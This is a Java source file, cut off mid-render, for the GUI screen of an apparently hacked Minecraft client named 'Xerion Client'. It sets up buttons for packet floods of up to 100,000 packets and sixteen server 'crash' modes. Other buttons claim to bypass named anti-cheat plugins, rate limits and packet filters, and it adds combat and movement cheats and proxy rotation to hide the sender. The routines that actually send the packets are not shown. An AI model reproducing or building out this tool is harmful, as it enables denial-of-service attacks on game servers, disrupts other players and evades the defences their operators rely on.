package com.professor.client.gui;

import com.professor.client.ProfessorClientMod;
import com.professor.client.proxy.ProxyManager;
import com.professor.client.task.BackgroundTaskManager;
import net.fabricmc.api.EnvType;
import net.fabricmc.api.Environment;
import net.minecraft.client.gui.DrawContext;
import net.minecraft.client.gui.screen.Screen;
import net.minecraft.client.gui.widget.ButtonWidget;
import net.minecraft.client.gui.widget.TextFieldWidget;
import net.minecraft.network.packet.c2s.play.*;
import net.minecraft.text.Text;
import net.minecraft.util.Hand;
import net.minecraft.util.math.MathHelper;

import com.professor.client.XerionModules;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;

@Environment(EnvType.CLIENT)
public class ProfessorScreen extends Screen {

    // ══ ICE PALETTE ═══════════════════════════════════════════════════════
    private static final int BG         = 0xFF010A14;
    private static final int PANEL_BG   = 0xFF041828;
    private static final int BORDER     = 0xFFAAEEFF;
    private static final int BORDER2    = 0xFF55CCFF;
    private static final int TITLE1     = 0xFFEEF8FF;
    private static final int TITLE2     = 0xFFFFD700;
    private static final int TXT_ICE    = 0xFF88DDFF;
    private static final int TXT_DIM    = 0xFF336688;
    private static final int TXT_BRIGHT = 0xFFCCF0FF;
    private static final int SNOW_W     = 0xFFFFFFFF;
    private static final int SNOW_B     = 0xFFCCEEFF;
    private static final int CRYSTAL    = 0xFF00CCEE;
    private static final int GOLD       = 0xFFFFD700;
    private static final int RED        = 0xFFFF2244;
    private static final int GREEN      = 0xFF00FF99;
    private static final int ORANGE     = 0xFFFF8800;
    private static final int PURPLE     = 0xFFAA55FF;
    // ── Danger / crash palette ────────────────────────────────────────
    private static final int BLOOD      = 0xFFCC0011;  // deep blood red
    private static final int DANGER     = 0xFFFF0033;  // neon danger red
    private static final int VOID_RED   = 0xFF1A0005;  // near-black red
    private static final int ACID       = 0xFFAAFF00;  // toxic green
    private static final int BONE       = 0xFFEEE8D5;  // skull bone white

    // ── Layout ─────────────────────────────────────────────────────────────
    private static final int PW = 760, PH = 520, TH = 36, TABH = 26;

    // ── Tabs ──────────────────────────────────────────────────────────────
    private static final String[] TABS = {"⚡FLOOD","❄BYPASS","💥EXPLOIT","☠CRASH","⚔COMBAT","🏃MOVE","💬CHAT","🌐PROXY"};
    private static final int      NT   = 8;
    private static final int[] TC = {0x55DDFF,0x00FFCC,0x88AAFF,0xFF3355,0xFF6644,0xFFBB44,0x44BBFF,0x55FF99};
    private int   tab      = 0;
    private float tabSlide = 1f;

    // ── Bypass modes ───────────────────────────────────────────────────────
    private static final String[] BP = {
        "OFF","BURST","WAVE","NCP","MATRIX","VULCAN","GRIM","GHOST","INTAVE","CRASHPASS","EXFIX",
        "GHOSTNET","ADAPTIVE","HAVOC","TIMESPLIT"
    };
    private int bypass = 0;

    // ── Settings ───────────────────────────────────────────────────────────
    private int     delay = 0, burst = 1, speed = 1;
    private boolean unlimited = false, timedMode = false, bgMode = true;
    private int     exploitType = 0, crashType = 0;
    private TextFieldWidget numField, chatField, proxyField;

    // ── Status / VL ────────────────────────────────────────────────────────
    private String statusText  = "Xerion Client v1  ❄  Ready";
    private int    statusColor = TXT_ICE;
    private int    statusTimer = 0;
    private float  vlEstimate  = 0f;
    private long   lastVlTick  = 0;

    // ── Animation ──────────────────────────────────────────────────────────
    private long  tick   = 0;
    private float glow   = 0f; private boolean glowUp = true;
    private float hue    = 0f;
    private float scanA  = 0f;
    private float hexOff = 0f;
    private float snowDrift = 0f;
    private float hypeSmooth = 0f;

    // ── Snow ───────────────────────────────────────────────────────────────
    private static final int SCNT = 220;
    private final float[] sx=new float[SCNT],sy=new float[SCNT];
    private final float[] ssp=new float[SCNT],ssz=new float[SCNT];
    private final float[] sal=new float[SCNT],sph=new float[SCNT];

    // ── Sparkles ───────────────────────────────────────────────────────────
    private static final int GPCNT = 60;
    private final float[] gpx=new float[GPCNT],gpy=new float[GPCNT];
    private final float[] gpp=new float[GPCNT],gps=new float[GPCNT];

    // ── Particles ──────────────────────────────────────────────────────────
    private static final int PCNT = 200;
    private final float[] ppx=new float[PCNT],ppy=new float[PCNT];
    private final float[] pvx=new float[PCNT],pvy=new float[PCNT];
    private final float[] psz=new float[PCNT],pal=new float[PCNT];
    private final float[] pph=new float[PCNT]; private final int[] pct=new int[PCNT];

    // ── Mouse trail ────────────────────────────────────────────────────────
    private record TrailPt(int x, int y, int color, float life){}
    private final List<TrailPt> trail = new ArrayList<>();
    private int lastMx=-1, lastMy=-1;

    // ── Data stream ────────────────────────────────────────────────────────
    private static final String DS = "XERION01FROST10BYPASS00ICE11EXFIX";
    private final float[] dsX=new float[70],dsY=new float[70],dsSp=new float[70];
    private final int[]   dsCh=new int[70];

    // ── Hype burst ─────────────────────────────────────────────────────────
    private final List<float[]> burstPts = new ArrayList<>();

    private final Random rng = new Random();

    // ══════════════════════════════════════════════════════════════════════
    public ProfessorScreen() {
        super(Text.literal("Xerion Client"));
        initAll();
    }

    @Override protected void init()    { initAll(); rebuild(); ProfessorMusicManager.onOpen(client); }
    @Override public void    removed() { super.removed(); /* music & BG tasks keep running */ }
    @Override public boolean shouldPause() { return false; }

    private void initAll() {
        int W=width<=0?800:width, H=height<=0?600:height;
        for(int i=0;i<SCNT;i++){sx[i]=rng.nextFloat()*W;sy[i]=rng.nextFloat()*H;ssp[i]=rng.nextFloat()*.85f+.2f;ssz[i]=rng.nextFloat()*4f+1f;sal[i]=rng.nextFloat()*.75f+.25f;sph[i]=rng.nextFloat()*6.28f;}
        for(int i=0;i<GPCNT;i++){gpx[i]=rng.nextFloat()*W;gpy[i]=rng.nextFloat()*H;gpp[i]=rng.nextFloat()*6.28f;gps[i]=rng.nextFloat()*3f+1.5f;}
        for(int i=0;i<PCNT;i++){ppx[i]=rng.nextFloat()*W;ppy[i]=rng.nextFloat()*H;pvx[i]=(rng.nextFloat()-.5f)*.5f;pvy[i]=-(rng.nextFloat()*.7f+.1f);psz[i]=rng.nextFloat()*3+.5f;pal[i]=rng.nextFloat()*.85f+.15f;pph[i]=rng.nextFloat()*6.28f;pct[i]=rng.nextInt(5);}
        for(int i=0;i<70;i++){dsX[i]=i*(W/70f);dsY[i]=rng.nextFloat()*-H;dsSp[i]=rng.nextFloat()*1.3f+.4f;dsCh[i]=rng.nextInt(DS.length());}
    }

    // ── Rebuild widgets ────────────────────────────────────────────────────
    private void rebuild() {
        clearChildren(); numField=null; chatField=null; proxyField=null;
        int cx=width/2, bpx=cx-PW/2, bpy=height/2-PH/2;
        int tabW=(PW-14)/NT;
        for(int i=0;i<NT;i++){final int idx=i; addDrawableChild(ButtonWidget.builder(Text.literal(TABS[i]),b->{cs();switchTab(idx);}).dimensions(bpx+7+i*(tabW+1),bpy+TH+5,tabW,TABH).build());}
        switch(tab){
            case 0->buildFlood(cx,bpy);  case 1->buildBypass(cx,bpy,bpx);
            case 2->buildExploit(cx,bpy); case 3->buildCrash(cx,bpy);
            case 4->buildCombat(cx,bpy);  case 5->buildMove(cx,bpy);
            case 6->buildChat(cx,bpy);    case 7->buildProxy(cx,bpy,bpx);
        }
        addDrawableChild(ButtonWidget.builder(Text.literal("✕  CLOSE"),b->{cs();close();}).dimensions(cx-48,bpy+PH-30,96,22).build());
    }

    private void switchTab(int t){if(t==tab)return;tab=t;tabSlide=0f;rebuild();}
    private void cs(){if(client!=null)ProfessorClientMod.playClickSound(client);}
    private void flash(String t,int c){statusText=t;statusColor=c;statusTimer=200;}
    private void addVl(float v){vlEstimate=Math.min(100f,vlEstimate+v);lastVlTick=tick;}

    // ══ TAB BUILDERS ══════════════════════════════════════════════════════

    private void buildFlood(int cx,int bpy){
        int y=bpy+75,bw=320;
        addDrawableChild(ButtonWidget.builder(Text.literal(unlimited?"MODE: UNLIMITED !!!":"MODE: COUNT"),b->{cs();unlimited=!unlimited;b.setMessage(Text.literal(unlimited?"MODE: UNLIMITED !!!":"MODE: COUNT"));}).dimensions(cx-bw/2,y,bw,20).build());
        addDrawableChild(ButtonWidget.builder(Text.literal(timedMode?"SEND: TIMED (EF-safe)":"SEND: INSTANT"),b->{cs();timedMode=!timedMode;b.setMessage(Text.literal(timedMode?"SEND: TIMED (EF-safe)":"SEND: INSTANT"));}).dimensions(cx-bw/2,y+24,bw,18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal(bgMode?"BG-MODE: ON (GUI closeable)":"BG-MODE: OFF"),b->{cs();bgMode=!bgMode;b.setMessage(Text.literal(bgMode?"BG-MODE: ON (GUI closeable)":"BG-MODE: OFF"));}).dimensions(cx-bw/2,y+46,bw,18).build());
        numField=new TextFieldWidget(textRenderer,cx-75,y+68,150,18,Text.empty());numField.setMaxLength(9);numField.setText("10000");addSelectableChild(numField);
        int[][] pr={{1000,-190},{5000,-85},{20000,40},{100000,160}};
        for(int[] p:pr){int n=p[0];addDrawableChild(ButtonWidget.builder(Text.literal(n>=1000?(n/1000)+"K":""+n),b->{cs();numField.setText(""+n);}).dimensions(cx+p[1]-28,y+90,56,16).build());}
        addDrawableChild(ButtonWidget.builder(Text.literal("Bypass: "+BP[bypass]),b->{cs();bypass=(bypass+1)%BP.length;b.setMessage(Text.literal("Bypass: "+BP[bypass]));}).dimensions(cx-bw/2,y+110,bw,18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("Delay: "+delay+"ms"),b->{cs();delay=(delay+5)%55;b.setMessage(Text.literal("Delay: "+delay+"ms"));}).dimensions(cx-bw/2,y+132,bw,16).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("⛔ STOP BACKGROUND"),b->{cs();ProfessorClientMod.clearQueue();BackgroundTaskManager.cancelAll();flash("⛔ Queue cleared + BG tasks cancelled",RED);}).dimensions(cx-bw/2,y+152,bw,16).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("❄ >>>  SEND PACKETS  <<< ❄"),b->{cs();doFlood();}).dimensions(cx-150,y+174,300,28).build());
    }

    private void buildBypass(int cx,int bpy,int bpx){
        int bw=PW-38,x=bpx+19,y=bpy+70;
        String[] bi={
            "Raw — no bypass applied",
            "Burst — Y 0.0625 every 3 pkts  (basic AC)",
            "Wave — sine Y ~0.08 amplitude  (NCP old)",
            "NCP — multi-pattern spoofing  (NoCheatPlus)",
            "Matrix — 4-step Y pattern  (Matrix 6+)",
            "Vulcan — micro-variance + sparse jump  (Vulcan 1.7)",
            "Grim — vanilla-like sparse movement  (Grim 2.3)",
            "Ghost — ultra-stealth minimal drift  (any AC)",
            "Intave — dual-sine harmonic  (Intave 14)",
            "CrashPass — extreme gaussian noise  (crash ACs)",
            "EXFIX ★ — TeleportConfirm 0.01 VL/pkt @2000/sec",
            "GhostNet ★★ — Brownian motion, undetectable variance",
            "Adaptive ★★ — switches pattern every 50 pkts, confuses ML",
            "Havoc ★★★ — chaos flood overwhelms detection pipeline",
            "TimeSplit ★★★ — micro-burst windows + realistic gaps"
        };
        for(int i=0;i<BP.length;i++){
            final int idx=i; boolean sel=(bypass==idx);
            addDrawableChild(ButtonWidget.builder(Text.literal((sel?"▶ ❄ ":"")+BP[i]+"   "+bi[i]),b->{cs();bypass=idx;rebuild();}).dimensions(x,y+i*19,bw,17).build());
        }
        int ay=y+BP.length*19+14; int hw=(bw-4)/2;
        addDrawableChild(ButtonWidget.builder(Text.literal("📦 Packet Filter Bypass"),  b->{cs();bypassPacketFilter();}).dimensions(x,     ay,   hw,17).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("🛡 Anti-Exploit Bypass"),   b->{cs();bypassAntiExploit();}).dimensions(x+hw+4, ay,   hw,17).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("📋 NBT Filter Bypass"),     b->{cs();bypassNBT();}).dimensions(x,     ay+21,hw,17).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("📖 Book Protection Bypass"),b->{cs();bypassBook();}).dimensions(x+hw+4,ay+21,hw,17).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("👾 Entity Limit Bypass"),   b->{cs();bypassEntity();}).dimensions(x,     ay+42,hw,17).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("🗺 Chunk Protection Bypass"),b->{cs();bypassChunk();}).dimensions(x+hw+4,ay+42,hw,17).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("⏱ Rate-Limit Bypass"),     b->{cs();bypassRateLimit();}).dimensions(x,     ay+63,hw,17).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("❄ ExploitFixer FULL Flood"),b->{cs();bypassExploitFixer();}).dimensions(x+hw+4,ay+63,hw,17).build());
    }

    private void buildExploit(int cx,int bpy){
        // 14 exploit types — 2 columns
        String[] en={
            "Swing Flood        — main hand burst",
            "Slot Spam          — slot 0-8 loop",
            "Teleport Ack       — confirm storm",
            "Move Flood         — micro-position",
            "Interact Flood     — off-hand burst",
            "Sneak Toggle       — rapid crouch",
            "Sprint Toggle      — sprint on/off",
            "Dual-Hand Burst    — both hands",
            "Ground Flip        — on/off rapid",
            "Full Combo         — swing+move+slot",
            "Look Spam          — yaw/pitch rotate",
            "Position Jitter    — chaos coords",
            "Slot Cycle         — all 9 slots",
            "TeleMove Mix       — confirm+move"
        };
        int col=en.length/2, hw=256;
        for(int i=0;i<en.length;i++){
            final int idx=i;
            int col2=i<col?0:1, row=i%col;
            addDrawableChild(ButtonWidget.builder(
                Text.literal((exploitType==idx?"▶ ❄ ":"")+en[i]),
                b->{cs();exploitType=idx;rebuild();}
            ).dimensions(cx-260+col2*(hw+8),bpy+72+row*22,hw,18).build());
        }
        numField=new TextFieldWidget(textRenderer,cx-75,bpy+388,150,18,Text.empty());
        numField.setMaxLength(7);numField.setText("1000");addSelectableChild(numField);
        addDrawableChild(ButtonWidget.builder(Text.literal("❄ >>>  EXECUTE EXPLOIT  <<<"),
            b->{cs();doExploit();}).dimensions(cx-150,bpy+410,300,26).build());
    }

    private void buildCrash(int cx,int bpy){
        // 16 crash types — 2 columns of 8
        String[] cn={
            "☠ Packet Storm    — 100k move flood",
            "☠ Teleport Bomb   — 50k random acks",
            "☠ Move Overflow   — extreme coords",
            "☠ Chat Flood      — 500 messages",
            "☠ Swing Storm     — 200k swings",
            "☠ Slot Bomb       — 100k slot spam",
            "☠ Ground Glitch   — ground flip 80k",
            "☠ Full Combo Nuke — all types mix",
            "☠ Sneak Bomb      — 30k sneak cycle",
            "☠ Sprint Storm    — 30k sprint cycle",
            "☠ Look Nuke       — extreme yaw/pitch",
            "☠ Interact Bomb   — 50k off-hand",
            "☠ Teleport Mix    — ack + move 60k",
            "☠ Dual Hand Nuke  — both hands 100k",
            "☠ Tick Overload   — 10k combo tick",
            "☠ OMEGA NUKE  ★★★ — ALL types FULL"
        };
        int col=cn.length/2, hw=254;
        for(int i=0;i<cn.length;i++){
            final int idx=i;
            int col2=i<col?0:1, row=i%col;
            boolean isDanger=(idx==15);
            addDrawableChild(ButtonWidget.builder(
                Text.literal((crashType==idx?"▶ ":"  ")+cn[i]),
                b->{cs();crashType=idx;rebuild();}
            ).dimensions(cx-260+col2*(hw+8),bpy+72+row*21,hw,19).build());
        }
        addDrawableChild(ButtonWidget.builder(
            Text.literal("☠  EXECUTE CRASH  ☠"),
            b->{cs();doCrash();}
        ).dimensions(cx-140,bpy+252,280,28).build());
    }

    private void buildCombat(int cx,int bpy){
        int bw=420,bx=cx-bw/2,y=bpy+74;
        addDrawableChild(ButtonWidget.builder(Text.literal("[1]  Hit Spam — 200×burst swings"),    b->{cs();combatHit();}).dimensions(bx,y,    bw,20).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[2]  Crit Exploit — 0.42 Y-jump + hit"),b->{cs();combatCrit();}).dimensions(bx,y+24,bw,20).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[3]  Anti-KB  (one-shot 150 pkts)"),    b->{cs();combatAKB();}).dimensions(bx,y+48,bw,20).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[4]  Fast Use — 80 off-hand use"),      b->{cs();combatFU();}).dimensions(bx,y+72,bw,20).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[5]  Reach — arc position flood"),      b->{cs();combatReach();}).dimensions(bx,y+96,bw,20).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[6]  Velocity Abuse — mixed Y arc"),    b->{cs();combatVelo();}).dimensions(bx,y+120,bw,20).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("Burst: "+burst+"x"),b->{cs();burst=burst%8+1;b.setMessage(Text.literal("Burst: "+burst+"x"));}).dimensions(cx-60,y+144,120,18).build());
        // ── Persistent modules ────────────────────────────────────────────
        int hw2=bw/2-3;
        addDrawableChild(ButtonWidget.builder(Text.literal(XerionModules.autoSwing?"▶ AUTO-SWING  ON ❄":"   AUTO-SWING  OFF"),b->{cs();XerionModules.autoSwing=!XerionModules.autoSwing;rebuild();}).dimensions(bx,y+166,hw2,20).build());
        addDrawableChild(ButtonWidget.builder(Text.literal(XerionModules.antiAfk?"▶ ANTI-AFK  ON ❄":"   ANTI-AFK  OFF"),b->{cs();XerionModules.antiAfk=!XerionModules.antiAfk;rebuild();}).dimensions(bx+hw2+4,y+166,hw2,20).build());
        addDrawableChild(ButtonWidget.builder(Text.literal(XerionModules.noFallAlways?"▶ NO-FALL  ON ❄":"   NO-FALL  OFF"),b->{cs();XerionModules.noFallAlways=!XerionModules.noFallAlways;rebuild();}).dimensions(bx,y+190,hw2,20).build());
        addDrawableChild(ButtonWidget.builder(Text.literal(XerionModules.antiKbAlways?"▶ ANTI-KB  ON ❄":"   ANTI-KB  OFF"),b->{cs();XerionModules.antiKbAlways=!XerionModules.antiKbAlways;rebuild();}).dimensions(bx+hw2+4,y+190,hw2,20).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("Swing Delay: "+XerionModules.autoSwingDelay+"ms"),b->{cs();XerionModules.autoSwingDelay=XerionModules.autoSwingDelay>=200?20:XerionModules.autoSwingDelay+20;rebuild();}).dimensions(bx,y+214,bw,18).build());
    }

    private void buildMove(int cx,int bpy){
        int bw=420,bx=cx-bw/2,y=bpy+74;
        addDrawableChild(ButtonWidget.builder(Text.literal("[1]  Speed Boost"),b->{cs();moveSpd();}).dimensions(bx,y,   bw,20).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[2]  Blink"),       b->{cs();moveBlink();}).dimensions(bx,y+24,bw,20).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[3]  Fly Exploit"), b->{cs();moveFly();}).dimensions(bx,y+48,bw,20).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[4]  NoFall"),       b->{cs();moveNF();}).dimensions(bx,y+72,bw,20).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[5]  Step"),          b->{cs();moveStep();}).dimensions(bx,y+96,bw,20).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[6]  Strafe"),        b->{cs();moveStrafe();}).dimensions(bx,y+120,bw,20).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[7]  Copy Coords"),   b->{cs();copyCoords();}).dimensions(bx,y+144,bw,20).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("Speed: "+speed+"x"),b->{cs();speed=speed%12+1;b.setMessage(Text.literal("Speed: "+speed+"x"));}).dimensions(cx-60,y+170,120,18).build());
    }

    private void buildChat(int cx,int bpy){
        chatField=new TextFieldWidget(textRenderer,cx-200,bpy+80,400,20,Text.empty());chatField.setMaxLength(256);chatField.setText("Hello!");addSelectableChild(chatField);
        numField=new TextFieldWidget(textRenderer,cx-75,bpy+106,150,18,Text.empty());numField.setMaxLength(6);numField.setText("20");addSelectableChild(numField);
        addDrawableChild(ButtonWidget.builder(Text.literal("💬 SPAM MESSAGE"),  b->{cs();doChat();}).dimensions(cx-210,bpy+130,200,22).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("⚙ SEND COMMAND"),  b->{cs();doCmd();}).dimensions(cx+10, bpy+130,200,22).build());
        // Preset commands
        String[] pre={"/spawn","/home","/tpa ","/tp ~10 ~ ~","/kill","/back","/warp ","/fly"};
        int pw2=96; for(int i=0;i<pre.length;i++){final String p=pre[i];addDrawableChild(ButtonWidget.builder(Text.literal(p),b->{cs();if(chatField!=null){chatField.setText(p);}}).dimensions(cx-200+(i%4)*(pw2+4),bpy+160+(i/4)*20,pw2,18).build());}
        // Stats
    }

    private void buildProxy(int cx, int bpy, int bpx) {
        int bw=PW-38, x=bpx+19, y=bpy+68;

        // Proxy enabled toggle
        addDrawableChild(ButtonWidget.builder(
            Text.literal(ProxyManager.isEnabled() ? "PROXY: ENABLED ✓" : "PROXY: DISABLED"),
            b -> { cs(); ProxyManager.setEnabled(!ProxyManager.isEnabled()); rebuild(); }
        ).dimensions(x, y, bw, 20).build());

        // Stats line
        // Proxy input field
        proxyField = new TextFieldWidget(textRenderer, x, y+26, bw-82, 18, Text.empty());
        proxyField.setMaxLength(512);
        proxyField.setSuggestion("ip:port  or  socks5://ip:port  or  ip:port:user:pass");
        addSelectableChild(proxyField);

        addDrawableChild(ButtonWidget.builder(Text.literal("ADD"),b->{
            cs();
            if(proxyField!=null&&!proxyField.getText().isBlank()){
                ProxyManager.addBulk(proxyField.getText());
                proxyField.setText("");
                flash("✓ Proxy added — total: "+ProxyManager.count(), GREEN);
                rebuild();
            }
        }).dimensions(x+bw-78,y+26,78,18).build());

        // Proxy list
        List<ProxyManager.ProxyEntry> all = ProxyManager.getAll();
        int listY = y + 50;
        for(int i=0;i<Math.min(all.size(),6);i++){
            final int idx=i;
            ProxyManager.ProxyEntry e=all.get(i);
            String label = (e.alive?"❄ ":"✗ ")+e.toString();
            addDrawableChild(ButtonWidget.builder(Text.literal(label),b->{ cs();ProxyManager.remove(idx);flash("Removed proxy #"+idx,ORANGE);rebuild();}).dimensions(x,listY+i*19,bw,17).build());
        }
        if(all.size()>6){
            int moreY=listY+6*19;
            // Just a display text — no button needed
        }

        int btnY = listY + Math.max(6,all.size())*19 + 6;
        if(btnY > bpy+PH-70) btnY = bpy+PH-70;

        addDrawableChild(ButtonWidget.builder(Text.literal("🗑 CLEAR ALL PROXIES"),b->{cs();ProxyManager.clear();flash("⛔ All proxies cleared",RED);rebuild();}).dimensions(x,btnY,bw/2-4,18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("📋 BULK PASTE"),b->{
            cs();
            if(proxyField!=null){
                String t=proxyField.getText();
                if(!t.isBlank()){ProxyManager.addBulk(t);proxyField.setText("");flash("✓ Bulk added — total: "+ProxyManager.count(),GREEN);rebuild();}
            }
        }).dimensions(x+bw/2+4,btnY,bw/2-4,18).build());
    }

    // ══ RENDER ════════════════════════════════════════════════════════════
    @Override
    public void render(DrawContext ctx, int mx, int my, float delta) {
        tick++;
        float hype = ProfessorMusicManager.getHypeLevel();
        hypeSmooth = hypeSmooth * 0.88f + hype * 0.12f;
        hue   = (hue + 0.004f) % 1f;
        scanA = (scanA + 1.2f) % (height + 60);
        hexOff= (hexOff + 0.22f) % 60f;
        snowDrift = tick * 0.009f;

        glow += glowUp ? 0.028f : -0.028f;
        if(glow>=1f){glow=1f;glowUp=false;} else if(glow<=0f){glow=0f;glowUp=true;}

        if(statusTimer>0){statusTimer--;if(statusTimer==0){statusText="Xerion Client v1  ❄  Ready";statusColor=TXT_ICE;}}
        if(!BackgroundTaskManager.isIdle()){statusText=BackgroundTaskManager.getStatus();statusColor=BackgroundTaskManager.getStatusColor();statusTimer=2;}

        // Decay VL
        if(tick-lastVlTick>20) vlEstimate=Math.max(0f,vlEstimate-0.4f);

        // Update snow
        for(int i=0;i<SCNT;i++){
            sy[i]+=ssp[i]; sx[i]+=MathHelper.sin(snowDrift+sph[i])*0.38f; sph[i]+=0.007f;
            if(sy[i]>height+6){sy[i]=-6;sx[i]=rng.nextFloat()*width;}
            if(sx[i]<-6)sx[i]=width+5; if(sx[i]>width+5)sx[i]=-6;
        }
        for(int i=0;i<GPCNT;i++) gpp[i]+=0.052f;
        for(int i=0;i<PCNT;i++){
            ppx[i]+=pvx[i]; ppy[i]+=pvy[i];
            pph[i]+=0.06f; pvx[i]+=(rng.nextFloat()-.5f)*.02f;
            if(ppy[i]<-8||ppx[i]<-8||ppx[i]>width+8){ppx[i]=rng.nextFloat()*width;ppy[i]=height;pvx[i]=(rng.nextFloat()-.5f)*.4f;pvy[i]=-(rng.nextFloat()*.6f+.1f);}
        }
        // Data streams
        for(int i=0;i<70;i++){dsY[i]+=dsSp[i];if(dsY[i]>height+20){dsY[i]=-20;dsCh[i]=rng.nextInt(DS.length());}if(rng.nextInt(25)==0)dsCh[i]=rng.nextInt(DS.length());}
        // Mouse trail
        if(mx!=lastMx||my!=lastMy){trail.add(new TrailPt(mx,my,withA(BORDER2,(int)(180*glow)),1f));lastMx=mx;lastMy=my;}
        trail.replaceAll(t->new TrailPt(t.x(),t.y(),t.color(),(t.life()-0.08f)));
        trail.removeIf(t->t.life()<=0);
        // Burst
        burstPts.replaceAll(p->{p[2]+=p[3];p[4]-=0.035f;return p;});
        burstPts.removeIf(p->p[4]<=0);

        int cx2=width/2, bpx=cx2-PW/2, bpy=height/2-PH/2;

        // ── Background — red grid on CRASH tab ─────────────────────────────
        int bgBase=tab==3?0xFF0A0000:BG;
        ctx.fill(0,0,width,height,bgBase);
        int gridCol=tab==3?0x220000:0x113355;
        for(int xi=0;xi<width;xi+=44){ctx.fill(xi,0,xi+1,height,withA(gridCol,10));}
        for(int yi=0;yi<height;yi+=44){ctx.fill(0,yi,width,yi+1,withA(gridCol,10));}

        // Scan line
        int scA=(int)(12+8*hypeSmooth);
        ctx.fill(0,(int)(scanA-2),width,(int)scanA,withA(BORDER2,scA));

        // Data streams — red on CRASH tab
        int dsCol=tab==3?0xFF3300:0x44BBDD;
        for(int i=0;i<70;i++){if(dsY[i]<0)continue;int a=(int)(45+25*hypeSmooth);if(a>0)ctx.drawText(textRenderer,String.valueOf(DS.charAt(dsCh[i])),(int)dsX[i]-4,(int)dsY[i],withA(dsCol,a),false);}

        // Snow particles
        for(int i=0;i<SCNT;i++){
            float tw=(MathHelper.sin(sph[i])+1f)/2f;
            int a=(int)(sal[i]*(0.5f+0.5f*tw)*255); if(a<12)continue;
            int sz=(int)ssz[i]; int col=ssz[i]>3.5f?SNOW_W:ssz[i]>2.5f?SNOW_B:0xFFAABBCC;
            ctx.fill((int)sx[i],(int)sy[i],(int)sx[i]+sz,(int)sy[i]+sz,withA(col,a));
            if(sz>=3&&a>130)ctx.fill((int)sx[i]+1,(int)sy[i]+1,(int)sx[i]+sz-1,(int)sy[i]+sz-1,withA(SNOW_W,Math.min(255,a+50)));
        }
        // Sparkles
        for(int i=0;i<GPCNT;i++){float tw=(MathHelper.sin(gpp[i])+1f)/2f;if(tw<0.65f)continue;int a=(int)((tw-.65f)*2.86f*200);if(a<20)continue;int sz=(int)gps[i];ctx.fill((int)gpx[i]-sz,(int)gpy[i],(int)gpx[i]+sz,(int)gpy[i]+1,withA(SNOW_W,a));ctx.fill((int)gpx[i],(int)gpy[i]-sz,(int)gpx[i]+1,(int)gpy[i]+sz,withA(SNOW_W,a));}
        // Particles — red on CRASH tab, ice otherwise
        for(int i=0;i<PCNT;i++){if(pal[i]<.12f)continue;
            int[] cols2=tab==3?new int[]{0xFFFF0022,0xFFCC0011,0xFFFF3300,0xFFFF6600,0xFFAA0033}:new int[]{0xFF55DDFF,0xFF00FFCC,0xFF88AAFF,0xFFFFD700,0xFF00FF99};
            int a=(int)(pal[i]*(0.5f+0.5f*MathHelper.sin(pph[i]))*160*(1+hypeSmooth));if(a<15)continue;int sz=(int)(psz[i]*(1+hypeSmooth*.5f));ctx.fill((int)ppx[i],(int)ppy[i],(int)ppx[i]+sz,(int)ppy[i]+sz,withA(cols2[pct[i]],a));}
        // Trail
        for(TrailPt tp:trail){int a=(int)(tp.life()*120);if(a>0)ctx.fill(tp.x()-1,tp.y()-1,tp.x()+1,tp.y()+1,withA(BORDER2,a));}
        // Burst
        for(float[] b2:burstPts){int a=(int)(b2[4]*200);if(a>0)ctx.fill((int)b2[0],(int)b2[1],(int)b2[0]+2,(int)b2[1]+2,withA(0xFFFFD700,a));}

        // ── Panel shadow + body ─────────────────────────────────────────────
        ctx.fill(bpx+16,bpy+16,bpx+PW+16,bpy+PH+16,withA(0xFF000000,160));
        ctx.fill(bpx+8, bpy+8, bpx+PW+8, bpy+PH+8, withA(0xFF000000,80));
        int panelBg=(tab==3)?0xFF0D0003:PANEL_BG;
        ctx.fill(bpx,bpy,bpx+PW,bpy+PH,panelBg);
        if(tab==3){
            // Red gradient header
            for(int yr=0;yr<60;yr++){int ga=(int)((1f-yr/60f)*28*(float)(0.55+0.45*Math.sin(tick*0.06)));if(ga>0)ctx.fill(bpx,bpy+yr,bpx+PW,bpy+yr+1,(ga<<24)|0xCC0011);}
        } else {
            for(int yr=0;yr<60;yr++){int ga=(int)((1f-yr/60f)*22*(1+hypeSmooth));if(ga>0)ctx.fill(bpx,bpy+yr,bpx+PW,bpy+yr+1,(ga<<24)|0xAADDFF);}
        }

        // Hype pulse overlay
        if(hypeSmooth>0.05f){int ha=(int)(hypeSmooth*18);if(ha>0)ctx.fill(bpx,bpy,bpx+PW,bpy+PH,withA(0xFF004488,ha));}
        // ── CRASH TAB: blood overlay + danger grid ─────────────────────
        if(tab==3){
            float dPulse=(float)(0.55+0.45*Math.sin(tick*0.06));
            int bloodA=(int)(dPulse*38);
            ctx.fill(bpx,bpy,bpx+PW,bpy+PH,withA(BLOOD,bloodA));
            // Danger scan lines — bright red sweep
            int dScan=(int)((tick*1.8f)%(PH+60))-30;
            ctx.fill(bpx,bpy+dScan,bpx+PW,bpy+dScan+3,withA(DANGER,(int)(dPulse*90)));
            ctx.fill(bpx,bpy+dScan+3,bpx+PW,bpy+dScan+5,withA(DANGER,(int)(dPulse*35)));
            // Red vignette edges
